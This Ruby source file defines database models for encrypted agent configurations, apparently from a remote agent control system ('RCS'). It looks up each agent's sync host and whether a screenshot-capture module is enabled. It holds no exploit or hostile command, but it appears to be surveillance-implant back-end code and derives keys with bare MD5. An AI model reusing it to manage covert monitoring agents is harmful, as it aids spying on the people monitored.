require 'mongoid'

require 'rcs-common/crypt'

#module RCS
#module DB

class Configuration
  include Mongoid::Document
  include Mongoid::Timestamps
  include RCS::Crypt

  field :desc, type: String
  field :user, type: String
  field :saved, type: Integer
  field :sent, type: Integer
  field :activated, type: Integer

  field :config, type: String   #json
  
  embedded_in :item

  def encrypted_config(confkey)
    # encrypt the config for the agent using the confkey
    aes_encrypt(self.config.force_encoding('ASCII-8BIT') + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
  end

  def sync_host
    # search for the first sync action and take the sync address
    config = JSON.parse(self.config)
    config['actions'].each do |action|
      action['subactions'].each do |sub|
        if sub['action'] == 'synchronize'
          return sub['host']
        end
      end
    end
    return nil
  end

  def screenshot_enabled?
    # search for the configuration of the screenshot
    config = JSON.parse(self.config)
    config['actions'].each do |action|
      action['subactions'].each do |sub|
        if sub['action'] == 'module' and sub['status'] == 'start' and sub['module'] == 'screenshot'
          return true
        end
      end
    end
    return false
  end

end


class Template
  include Mongoid::Document
  include Mongoid::Timestamps

  field :desc, type: String
  field :user, type: String

  field :config, type: String   #json

  store_in collection: 'templates'
end


#end # ::DB
#end # ::RCS